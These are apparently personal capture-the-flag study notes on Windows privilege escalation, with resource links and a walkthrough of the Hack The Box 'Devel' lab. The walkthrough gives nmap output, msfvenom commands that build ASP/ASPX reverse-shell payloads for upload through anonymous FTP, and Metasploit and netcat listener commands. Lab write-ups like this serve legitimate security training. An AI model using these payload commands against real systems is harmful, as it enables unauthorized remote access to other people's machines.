# Windows Privilege Escalation

# Links

[FuzzySecurity | Windows Privilege Escalation Fundamentals](https://fuzzysecurity.com/tutorials/16.html)

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[Windows Privilege Escalation Guide](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)

[Privilege Escalation - Windows · Total OSCP Guide](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)

[https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources](https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources)

# **Gaining a Foothold - HTB Devel**

Nmap Result

```bash
nmap -A 10.10.10.5 -oA Devel_1000_Nmap
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-06 08:08 EST
Nmap scan report for 10.10.10.5
Host is up (0.051s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-title: IIS7
|_http-server-header: Microsoft-IIS/7.5
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.79 seconds
```

The results say that FTP port is open with anonymous login allowed. Tried with uploading sample page >echo ”This is Sample text” > test.txt, uploading to the ftp port accessed through web page is working, but nmap_Results.nmap uploaded is not working, try to upload meterpreter payload.

> msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f asp > cal.asp
> 

>msfconsole

>use exploit/multi/handler

>set payload windows/meterpreter/reverse_tcp

>set LHOST/PORT

# Win Priv

[https://fuzzysecurity.com/tutorials/16.html](https://fuzzysecurity.com/tutorials/16.html)

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Windows - Privilege Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)

[https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/) 

[https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)

[https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources](https://github.com/TCM-Course-Resources/Windows-Privilege-Escalation-Resources)

# Devel - HTB

FTP port has anonymous access with upload put the file in FTP port, navigate through URl in browser got revshell

```markdown
>nmap -sC -sV --open -p- -T4 -A 10.10.10.5
#it has 21 (anonymous), 80 port open
>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 -f aspx -o met.aspx
https://github.com/frizb/MSF-Venom-Cheatsheet
https://www.hackingarticles.in/msfvenom-cheatsheet-windows-exploitation/
#put shell.asp
>nc -nlvp 443
```